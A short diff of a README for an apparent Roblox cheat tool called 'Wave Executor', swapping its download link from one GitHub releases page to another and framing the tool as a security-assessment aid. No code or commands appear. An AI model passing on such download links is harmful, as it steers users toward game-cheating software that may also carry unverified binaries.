@@ -19,7 +19,7 @@ While the program may be used to assess the security of roblox executor, it shou
 
 <br/>
 <p align="center">
-  <a href="https://github.com/CheatsHelp/Wave-Executor-Roblox/releases/tag/wave-roblox-executor">
+  <a href="https://github.com/RoblExploits/wave-executor-roblox/releases/tag/wave-executor-roblox">
     <img src="https://github.com/user-attachments/assets/1e95e98c-da95-443e-8222-225c7dae5a7a" alt="Logo" width="80" height="80">
   </a>
 
